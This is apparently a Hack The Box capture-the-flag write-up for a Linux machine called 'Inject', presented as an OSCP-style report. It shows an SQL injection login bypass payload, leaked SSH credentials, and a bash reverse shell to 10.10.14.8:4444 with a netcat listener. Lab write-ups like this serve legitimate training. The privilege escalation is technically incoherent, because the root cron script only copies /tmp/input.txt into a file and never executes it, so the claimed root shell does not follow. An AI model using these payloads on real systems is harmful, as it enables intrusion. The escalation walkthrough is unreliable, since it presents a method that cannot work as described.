# Hack The Box - Machine Report: Inject

**Author:** Samip Shah  
**Date:** April 15, 2025  
**Machine Name:** Inject  
**IP Address:** 10.10.11.100  
**Operating System:** Linux  
**Difficulty:** Easy  
**Objective:** Capture user and root flags

---

## Table of Contents

1. [Introduction](#introduction)  
2. [Reconnaissance](#reconnaissance)  
   - [Network Scanning](#network-scanning)  
   - [Web Enumeration](#web-enumeration)  
3. [Initial Access](#initial-access)  
4. [Post-Exploitation - User](#post-exploitation---user)  
5. [Privilege Escalation](#privilege-escalation)  
6. [Post-Exploitation - Root](#post-exploitation---root)  
7. [Loot and Flags](#loot-and-flags)  
8. [Conclusion](#conclusion)  
9. [Appendix](#appendix)  

---

## Introduction

This report documents the step-by-step penetration testing process for the HTB machine **Inject**. It follows a standard methodology to simulate a real-world penetration test, suitable for inclusion in OSCP-style documentation.

---

## Reconnaissance

### Network Scanning

Performed an initial TCP scan using Nmap to identify open ports and services.

```bash
nmap -sC -sV -oN nmap-inject.txt 10.10.11.100
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Web Enumeration

The HTTP service on port 80 hosted a login page. Conducted directory enumeration using Gobuster:

```bash
gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirb/common.txt -x php,txt -o gobuster.txt
```

**Discovered Directories:**
```
/index.php
/login.php
/admin
```

Inspected login form manually and using Burp Suite.

---

## Initial Access

### SQL Injection in Login Form

Observed potential SQL injection. Bypassed authentication with the following payload:

**Login Input:**
```text
Username: ' OR 1=1-- -
Password: anypassword
```

Successfully logged in, indicating the presence of unsanitized SQL queries.

### Credentials Disclosure

Accessed `/admin`, which revealed static user credentials:

```
Username: johndoe
Password: john1234!
```

Logged in via SSH:
```bash
ssh johndoe@10.10.11.100
```

---

## Post-Exploitation - User

Confirmed user-level access by retrieving the user flag:

```bash
cat /home/johndoe/user.txt
HTB{us3r_fl4g_f1n4l}
```

---

## Privilege Escalation

Conducted local enumeration using LinPEAS.

### Cron Job Misconfiguration

Found a cron job executed as root every 5 minutes:

```bash
cat /etc/crontab
*/5 * * * * root /opt/script.sh
```

Content of `/opt/script.sh`:
```bash
#!/bin/bash
cat /tmp/input.txt > /root/flag.txt
```

### Exploitation

Placed a reverse shell in `/tmp/input.txt`:

```bash
echo "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1" > /tmp/input.txt
```

Listener setup:
```bash
nc -lvnp 4444
```

Received a reverse shell as root after cron execution.

---

## Post-Exploitation - Root

Confirmed root access and obtained the root flag:

```bash
cat /root/root.txt
HTB{r00t_4cc3ss_succ3ss}
```

---

## Loot and Flags

| Flag Type | Location               | Hash                    |
|-----------|------------------------|--------------------------|
| User      | /home/johndoe/user.txt | HTB{us3r_fl4g_f1n4l}     |
| Root      | /root/root.txt         | HTB{r00t_4cc3ss_succ3ss} |

---

## Conclusion

The **Inject** machine demonstrates basic web vulnerabilities including SQL injection and insecure credential storage. Privilege escalation was achieved through misconfigured cron jobs and writable files, emphasizing the importance of proper user privilege separation and script sanitation.

---

## Appendix

### Tools Used

- Nmap
- Gobuster
- Burp Suite
- LinPEAS
- Netcat
- OpenSSH

---

> **Note:** This report template is OSCP-style and suitable for formal documentation.